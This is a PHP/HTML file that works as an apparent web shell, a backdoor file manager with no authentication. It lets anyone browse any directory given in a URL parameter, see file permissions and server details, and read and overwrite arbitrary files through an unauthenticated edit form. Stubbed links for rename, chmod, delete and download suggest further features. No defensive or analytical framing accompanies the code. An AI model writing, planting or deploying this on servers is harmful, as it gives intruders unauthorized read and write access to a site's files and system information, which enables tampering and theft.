<!DOCTYPE html>
<html>
<head>
	<title></title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<style type="text/css">
@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
body {
  font-family: 'Ubuntu Mono', monospace;
  line-height: 1.25;
  color: #8a8a8a;
  font-weight:normal;
  font-style: normal;
}

table {
  margin: 0;
  background:#fff;
  padding: 10px;
  border-spacing:0;
  width: 70%;
  border-radius:10px;
  box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
}

table caption {
  font-size: 1.5em;
  margin: .5em 0 .75em;
}

table tr {
    border: 1px solid red;
    padding: .35em;
  }

  table th {
  padding: .625em;
  text-align: center;
}

table td {
	padding: .625em;
	border-bottom: 1px solid #e8e8e8;
}

table th {
  font-size: .85em;
  letter-spacing: .1em;
  text-transform: uppercase;
}
textarea {
	padding: 12px 20px;
	width:88%;
	height:200px;
	resize:none;
	-moz-border-bottom-colors: none;
  	-moz-border-left-colors: none;
  	-moz-border-right-colors: none;
  	-moz-border-top-colors: none;
  	outline:none;
  	border-radius:6px;
  	border:1px solid rgba(222,222,222,0.73);
  	background:rgba(222,222,222,0.73);
  	color:#8a8a8a;
}
a {
	color:#8a8a8a;
	text-decoration:none;
}
input[type=submit] {
  font-family: 'Ubuntu Mono', monospace;
  outline:none;
  color:#8a8a8a;
  font-weight: bold;
  padding:7px;
  border-radius:6px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
}
input[type=text].action {
	width:87.5%;
	font-family: 'Ubuntu Mono', monospace;
	padding:12px;
	color:#8a8a8a;
	border-radius:7px;
	border: 1px solid #e8e8e8;
	outline:none;
	background:#e8e8e8;
}
table tr:last-child {
	border-bottom:none;
}
td.not {
	border-bottom:none;
}
td.yes {
	border-bottom: 2px solid #e8e8e8;
}
ul.action {
	background:transparent;
	padding: 10px 10px;
    border-radius:7px;
}
li.action {
	text-align:left;
	list-style:none;
	border:1px solid #e8e8e8;
	padding:10px 20px;
}
li.action:last-child {
	border-radius:0px 0px 7px 7px;
	border-top:none;
}
li.action:first-child {
	border-radius:7px 7px 0px 0px;
}
li.action:nth-child(2) {
	border-top:none;
}
li.action:hover {
	background: #e8e8e8;
	cursor: pointer;
}
div.action {
	width:50%;
}
div.action_f {
	width:50%;
}
@media screen and (max-width: 600px) {
  table {
  margin: 0;
  background:#fff;
  padding: 10px;
  width: 100%;
  border-radius:10px;
}
.strong {
	font-size:10px;
}
div.action {
	width:100%;
}
div.action_f {
	width:100%;
}
input[type=text].action {
	width:90%;
}
  
  table thead {
    border: none;
    clip: rect(0 0 0 0);
    height: 1px;
    margin: -1px;
    padding: 0;
    width: 1px;
  }
  
  table tr {
    border-radius:10px;
  }
  
  table td {
    font-size: .9em;
  }
  
  textarea {
	padding: 12px 20px;
	width:91%;
  }
  
  th.pol, td.pol {
  	display:none;
  }
  td.tol {
  	width:100%;
  }
</style>
<body>
<center>
<table>
<thead>
	<tr>
		<td class="yes" colspan="4">
			<?php
			foreach (get_server_info() as $k) {
    			echo "<div>".$k."</div>";
    		}
    		?>
    	</td>
    </tr>
</thead>
<?php
function cwd() {
  if (isset($_GET['path'])) {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
    @chdir($cwd);
  } else {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
  } return $cwd;
}
function perms($file) {
$perms = fileperms($file);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms, $po=false) {
  if (is_writable($filename)) {
    ?> <font color="green"><?php print $perms ?></font> <?php
  } else {
    ?> <font color="red"><?php print $perms ?></font> <?php
  }
}
function size($file) {
    $bytes = filesize($file);

    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
if (@$_GET['action'] == 'dir') {
	$file = $_GET['file'];
	?>
	<thead>
		<tr>
			<th>ACTION</th>
		</tr>
	</thead>
	<tr>
		<td class="not">
			<center>
				<div class="action">
					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
					<ul class="action">
						<li class="action"><a href="#rename">RENAME</a></li>
						<li class="action"><a href="#chmod"> CHMOD</a></li>
						<li class="action"><a href="#delete">DELETE</a></li>
					</ul>
				</div>
			</center>
		</td>
	</tr>
	<?php
	exit();
}
if (@$_GET['action'] == 'file') {
	$file = $_GET['file'];
	?>
	<thead>
		<tr>
			<th>ACTION</th>
		</tr>
	</thead>
	<tr>
		<td class="not">
			<center>
				<div class="action">
					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
					<ul class="action">
						<li class="action"><a href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a></li>
						<li class="action"><a href="#rename">RENAME</a></li>
						<li class="action"><a href="#chmod"> CHMOD</a></li>
						<li class="action"><a href="#delete">DELETE</a></li>
						<li class="action"><a href="#download">DOWNLOAD</a></li>
					</ul>
				</div>
			</center>
		</td>
	</tr>
	<?php
	exit();
}
if (isset($_GET['edit'])) {
	$file = $_GET['file'];
	?>
		<form method="post" id="login-form" class="modal">
			<tr>
				<td class="not">
					<center>
					<div class="action_f">
						Filename : <?= permission($file, basename($file)) ?><br><br>
						<textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
						<input style="width:100%;" type="submit" name="submit">
					</center>
				</td>
			</tr>
		</form>
	<?php
	if (isset($_POST['submit'])) {
		edit($_GET['file'], $_POST['text']);
	}
	exit();
}
function edit($file, $text) {
	$handle = fopen($file, "w");
	if (fwrite($handle, $text)) {
		header("Location: ?path=".cwd()."&alert=success");
	} else {
		header("Location: ?path=".cwd()."&alert=failed");
	}
}
function get_server_info(){
    $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
    $server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
    $server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
    $server_info['uname'] = php_uname();
    $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
    $server_info['software'] = $server_software."  PHP ".phpversion();    
    return $server_info;
  }
?>
  <tbody>
  <?php
  $scandir = scandir(cwd());
  	foreach ($scandir as $dir) {
  		if (is_dir($dir)) {
  			if ($dir === '..') {
  				$back = "<a href='?path=".dirname(cwd())."'>".$dir."</a>";
  			} elseif($dir === '.') {
  				$back = "<a href='?path=".cwd()."'>".$dir."</a>";
  			} else {
  				$back = "<a href='?path=".cwd().'/'.$dir."'>".$dir."</a>";
  			} if ($dir === '.' || $dir === '..') {
  				$action = "";
  			} else {
  				$action = '<a href="?path='.cwd().'&action=dir&file='.cwd().'/'.$dir.'">Action</a>';
  			}
  			?>
  			<tr>
  				<td class="tol">
  					<?=$back?>
  				</td>
  				<td class="pol">
  					<center>
  						<?= filetype(cwd().'/'.$dir) ?>
  					</center>
  				</td>
  				<td>
  					<center>
  						<?= permission($dir, perms($dir)) ?>
  					</center>
  				</td>
  				<td>
  					<center>
  						<?= $action ?>
  					</center>
  				</td>
  			</tr>
  			<?php
  		}
  	}
  	foreach ($scandir as $file) {
  		if (is_file($file)) {
  			$files = cwd().'/'.$file
  			?>
  			<tr>
  				<td class="tol"><?= basename($files) ?></td>
  				<td class="pol">
  					<center><?= size($files); ?></center>
  				</td>
  				<td>
  					<center>
  						<?= permission($files, perms($files)) ?>
  					</center>
  				</td>
      			<td>
      				<center>
      					<a href="?path=<?=cwd()?>&action=file&file=<?=$files?>">Action</a>
      				</center>
      			</td>
  			</tr>
  			<?php
  		}
  	}
  ?>

</tbody>
</table>
</center>
</body>
</html>
